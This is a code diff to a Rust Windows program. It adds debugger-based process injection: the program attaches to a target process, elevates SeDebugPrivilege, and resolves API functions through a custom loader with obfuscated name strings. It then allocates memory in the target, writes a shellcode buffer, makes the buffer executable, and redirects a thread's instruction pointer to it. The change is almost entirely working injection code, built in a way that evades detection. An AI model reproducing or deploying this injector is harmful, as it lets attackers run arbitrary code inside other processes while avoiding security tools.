@@ -6,7 +6,10 @@ use winapi::{
         minwindef::{BOOL, DWORD},
         ntdef::{HANDLE, NTSTATUS},
     },
-    um::winnt::{ACCESS_MASK, MAXIMUM_ALLOWED},
+    um::{
+        minwinbase::{DEBUG_EVENT, LPCONTEXT},
+        winnt::{ACCESS_MASK, CONTEXT, MAXIMUM_ALLOWED},
+    },
 };
 
 use noldr::{self, HMODULE, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64, TEB};
@@ -114,6 +117,64 @@ const SE_DEBUG_NAME: &str = "SeDebugPrivilege\0";
 // Add with other type definitions
 type DebugActiveProcessStopFn = unsafe extern "system" fn(dwProcessId: DWORD) -> BOOL;
 
+type WaitForDebugEventFn =
+    unsafe extern "system" fn(lpDebugEvent: *mut DEBUG_EVENT, dwMilliseconds: DWORD) -> BOOL;
+
+type GetThreadContext = unsafe extern "system" fn(hThread: HANDLE, lpContext: LPCONTEXT) -> BOOL;
+
+// Add near the top with other constants
+const CONTEXT_INTEGER: u32 = 0x00010002;
+const CONTEXT_CONTROL: u32 = 0x00010001;
+
+// Add with other type definitions
+type SetThreadContextFn =
+    unsafe extern "system" fn(hThread: HANDLE, lpContext: *const CONTEXT) -> BOOL;
+
+// Add with other constants at the top
+const EXCEPTION_DEBUG_EVENT: DWORD = 1;
+const EXCEPTION_SINGLE_STEP: DWORD = 0x80000004;
+const DBG_CONTINUE: DWORD = 0x00010002;
+const DBG_EXCEPTION_NOT_HANDLED: DWORD = 0x80010001;
+
+// Add with other type definitions
+type ContinueDebugEventFn = unsafe extern "system" fn(
+    dwProcessId: DWORD,
+    dwThreadId: DWORD,
+    dwContinueStatus: DWORD,
+) -> BOOL;
+
+// Add with other type definitions
+type VirtualAllocExFn = unsafe extern "system" fn(
+    hProcess: HANDLE,
+    lpAddress: *mut c_void,
+    dwSize: usize,
+    flAllocationType: DWORD,
+    flProtect: DWORD,
+) -> *mut c_void;
+
+type WriteProcessMemoryFn = unsafe extern "system" fn(
+    hProcess: HANDLE,
+    lpBaseAddress: *mut c_void,
+    lpBuffer: *const c_void,
+    nSize: usize,
+    lpNumberOfBytesWritten: *mut usize,
+) -> BOOL;
+
+// Add with other constants
+const MEM_COMMIT: DWORD = 0x1000;
+const MEM_RESERVE: DWORD = 0x2000;
+const PAGE_READWRITE: DWORD = 0x04;
+const PAGE_EXECUTE_READ: DWORD = 0x20;
+
+// Add VirtualProtectEx type definition
+type VirtualProtectExFn = unsafe extern "system" fn(
+    hProcess: HANDLE,
+    lpAddress: *const c_void,
+    dwSize: usize,
+    flNewProtect: DWORD,
+    lpflOldProtect: *mut DWORD,
+) -> BOOL;
+
 fn main() {
     let args: Vec<String> = std::env::args().collect();
 
@@ -162,15 +223,260 @@ fn main() {
 
     //check if the process is being debugged
     let is_debugged = unsafe { debug_active_process(target_pid as DWORD) };
-    println!("[+] Successfully attached to process as debugger: {}", is_debugged != 0);
+    println!(
+        "[+] Successfully attached to process as debugger: {}",
+        is_debugged != 0
+    );
 
-    let debug_active_process_stop = noldr::get_function_address(kernel32, &lc!("DebugActiveProcessStop"))
-        .unwrap_or_else(|| std::ptr::null_mut());
-    println!("[+] DebugActiveProcessStop address: {:?}", debug_active_process_stop);
+    let debug_active_process_stop =
+        noldr::get_function_address(kernel32, &lc!("DebugActiveProcessStop"))
+            .unwrap_or_else(|| std::ptr::null_mut());
+    println!(
+        "[+] DebugActiveProcessStop address: {:?}",
+        debug_active_process_stop
+    );
 
-    let debug_active_process_stop: DebugActiveProcessStopFn = 
+    let debug_active_process_stop: DebugActiveProcessStopFn =
         unsafe { std::mem::transmute(debug_active_process_stop) };
 
+    let mut debug_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
+
+    let wait_for_debug_event = noldr::get_function_address(kernel32, &lc!("WaitForDebugEvent"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] WaitForDebugEvent address: {:?}", wait_for_debug_event);
+
+    let wait_for_debug_event: WaitForDebugEventFn =
+        unsafe { std::mem::transmute(wait_for_debug_event) };
+
+    const INFINITE: DWORD = 0xFFFFFFFF;
+    let mut tid: DWORD = 0;
+    let mut h_process: HANDLE = std::ptr::null_mut();
+    let mut h_thread: HANDLE = std::ptr::null_mut();
+
+    let success = unsafe { wait_for_debug_event(&mut debug_event, INFINITE) };
+    if success != 0 {
+        tid = debug_event.dwThreadId;
+        h_process = unsafe { debug_event.u.CreateProcessInfo().hProcess };
+        h_thread = unsafe { debug_event.u.CreateProcessInfo().hThread };
+        println!(
+            "[+] Debug event received - TID: {}, Process Handle: {:?}, Thread Handle: {:?}",
+            tid, h_process, h_thread
+        );
+    }
+
+    //locate address for GetThreadContext in kernel32
+
+    let get_thread_context = noldr::get_function_address(kernel32, &lc!("GetThreadContext"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] GetThreadContext address: {:?}", get_thread_context);
+
+    let get_thread_context: GetThreadContext = unsafe { std::mem::transmute(get_thread_context) };
+
+    let mut original_context: CONTEXT = unsafe { std::mem::zeroed() };
+    let mut current_context: CONTEXT = unsafe { std::mem::zeroed() };
+
+    // Set the context flags
+    original_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+    current_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+
+    let success = unsafe { get_thread_context(h_thread, &mut original_context) };
+    if success != 0 {
+        println!("[+] Got original thread context");
+
+        // Get current context (for single step)
+        let success = unsafe { get_thread_context(h_thread, &mut current_context) };
+        if success != 0 {
+            println!("[+] Got current thread context");
+        }
+    }
+
+    // In main after getting contexts
+    current_context.EFlags |= 0x100;
+
+    let set_thread_context = noldr::get_function_address(kernel32, &lc!("SetThreadContext"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] SetThreadContext address: {:?}", set_thread_context);
+
+    let set_thread_context: SetThreadContextFn = unsafe { std::mem::transmute(set_thread_context) };
+
+    let success = unsafe { set_thread_context(h_thread, &current_context) };
+    if success != 0 {
+        println!("[+] Successfully set thread context with single step flag");
+    }
+
+    // After getting the debug event but before the debug loop:
+    let virtual_alloc_ex = noldr::get_function_address(kernel32, &lc!("VirtualAllocEx"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] VirtualAllocEx address: {:?}", virtual_alloc_ex);
+    let virtual_alloc_ex: VirtualAllocExFn = unsafe { std::mem::transmute(virtual_alloc_ex) };
+
+    let write_process_memory = noldr::get_function_address(kernel32, &lc!("WriteProcessMemory"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] WriteProcessMemory address: {:?}", write_process_memory);
+    let write_process_memory: WriteProcessMemoryFn =
+        unsafe { std::mem::transmute(write_process_memory) };
+
+    // Get VirtualProtectEx function address
+    let virtual_protect_ex = noldr::get_function_address(kernel32, &lc!("VirtualProtectEx"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] VirtualProtectEx address: {:?}", virtual_protect_ex);
+    let virtual_protect_ex: VirtualProtectExFn = unsafe { std::mem::transmute(virtual_protect_ex) };
+
+    // Allocate memory for shellcode with RW permissions initially
+    let shellcode_address = unsafe {
+        virtual_alloc_ex(
+            h_process,
+            std::ptr::null_mut(),
+            SHELL_CODE.len(),
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,  // Changed from PAGE_EXECUTE_READWRITE
+        )
+    };
+    println!(
+        "[+] Allocated memory for shellcode at: {:?}",
+        shellcode_address
+    );
+
+    // Write shellcode to allocated memory
+    let mut bytes_written: usize = 0;
+    let success = unsafe {
+        write_process_memory(
+            h_process,
+            shellcode_address,
+            SHELL_CODE.as_ptr() as *const c_void,
+            SHELL_CODE.len(),
+            &mut bytes_written,
+        )
+    };
+    println!("[+] Wrote {} bytes of shellcode", bytes_written);
+
+    // Change permissions to RX
+    let mut old_protect: DWORD = 0;
+    let success = unsafe {
+        virtual_protect_ex(
+            h_process,
+            shellcode_address,
+            SHELL_CODE.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        )
+    };
+    if success != 0 {
+        println!("[+] Changed memory protection to RX");
+    } else {
+        println!("[!] Failed to change memory protection");
+    }
+
+    // After setting thread context with single step flag
+    let continue_debug_event = noldr::get_function_address(kernel32, &lc!("ContinueDebugEvent"))
+        .unwrap_or_else(|| std::ptr::null_mut());
+    println!("[+] ContinueDebugEvent address: {:?}", continue_debug_event);
+
+    let continue_debug_event: ContinueDebugEventFn =
+        unsafe { std::mem::transmute(continue_debug_event) };
+
+    let mut cpt = 0;
+    while cpt < 1 {
+        if debug_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT {
+            println!("[*] Got debug event: Exception");
+            let exception_code = unsafe { debug_event.u.Exception().ExceptionRecord.ExceptionCode };
+            
+            if exception_code == 0x80000003 { // Breakpoint
+                println!("[*] Got breakpoint exception");
+                
+                current_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+                let success = unsafe { get_thread_context(h_thread, &mut current_context) };
+                if success != 0 {
+                    println!("[*] Current RIP before redirect: {:x}", current_context.Rip);
+                    println!("[*] Current RSP: {:x}", current_context.Rsp);
+                    println!("[*] Current EFLAGS: {:x}", current_context.EFlags);
+                    
+                    // Ensure stack is 16-byte aligned for x64 calling convention
+                    current_context.Rsp &= !0xF;
+                    // Allocate some stack space for our shellcode
+                    current_context.Rsp -= 0x2000;
+                    
+                    // Clear registers that shellcode might depend on
+                    current_context.Rcx = 0;
+                    current_context.Rdx = 0;
+                    current_context.R8 = 0;
+                    current_context.R9 = 0;
+                    
+                    // Set RIP to shellcode
+                    current_context.Rip = shellcode_address as u64;
+                    println!("[*] Setting RIP to shellcode address: {:x}", shellcode_address as u64);
+                    println!("[*] Adjusted RSP to: {:x}", current_context.Rsp);
+                    
+                    let success = unsafe { set_thread_context(h_thread, &mut current_context) };
+                    if success != 0 {
+                        println!("[*] Successfully set thread context with shellcode entry");
+                        
+                        // Continue execution
+                        unsafe { 
+                            continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+                        }
+                        
+                        // Wait for any exceptions
+                        let mut shellcode_event: DEBUG_EVENT = unsafe { std::mem::zeroed() };
+                        while unsafe { wait_for_debug_event(&mut shellcode_event, 1000) } != 0 {
+                            if shellcode_event.dwDebugEventCode == EXCEPTION_DEBUG_EVENT {
+                                let exception_code = unsafe { shellcode_event.u.Exception().ExceptionRecord.ExceptionCode };
+                                println!("[!] Exception during shellcode: {:x}", exception_code);
+                            }
+                            unsafe {
+                                continue_debug_event(
+                                    shellcode_event.dwProcessId,
+                                    shellcode_event.dwThreadId,
+                                    DBG_CONTINUE
+                                );
+                            }
+                        }
+                        
+                        cpt += 1;
+                    }
+                }
+            } else {
+                println!("[*] Got different exception: {:x}", exception_code);
+                unsafe { 
+                    continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_EXCEPTION_NOT_HANDLED);
+                }
+            }
+        } else {
+            if debug_event.dwDebugEventCode != 2 && debug_event.dwDebugEventCode != 6 {
+                println!("[*] Got debug event type: {}", debug_event.dwDebugEventCode);
+            }
+            unsafe { 
+                continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+            }
+        }
+        
+        if cpt == 0 {
+            unsafe { 
+                wait_for_debug_event(&mut debug_event, INFINITE);
+            }
+        }
+    }
+
+    // After the debug loop
+    println!("[+] Resuming process");
+    original_context.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
+    
+    let success = unsafe { set_thread_context(h_thread, &original_context) };
+    if success == 0 {
+        println!("[!] Failed to restore original context");
+    }
+    
+    unsafe { 
+        continue_debug_event(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
+    }
+
+        // After the debug loop, before detaching
+        println!("[*] Press Enter to detach and exit...");
+        let mut input = String::new();
+        std::io::stdin().read_line(&mut input).unwrap();
+
+    //this should always be at the end of main during dev
+    println!("[+] Stopping debug on target process");
     unsafe { debug_active_process_stop(target_pid as DWORD) };
 }
 
@@ -269,9 +575,13 @@ fn elevate_debug(
 
     println!("[+] Successfully opened process token: {:?}", token_handle);
 
-    let lookup_privilege_value = noldr::get_function_address(advapi32, &lc!("LookupPrivilegeValueA"))
-        .unwrap_or_else(|| std::ptr::null_mut());
-    println!("[+] LookupPrivilegeValueA address: {:?}", lookup_privilege_value);
+    let lookup_privilege_value =
+        noldr::get_function_address(advapi32, &lc!("LookupPrivilegeValueA"))
+            .unwrap_or_else(|| std::ptr::null_mut());
+    println!(
+        "[+] LookupPrivilegeValueA address: {:?}",
+        lookup_privilege_value
+    );
 
     let mut luid = LUID {
         LowPart: 0,
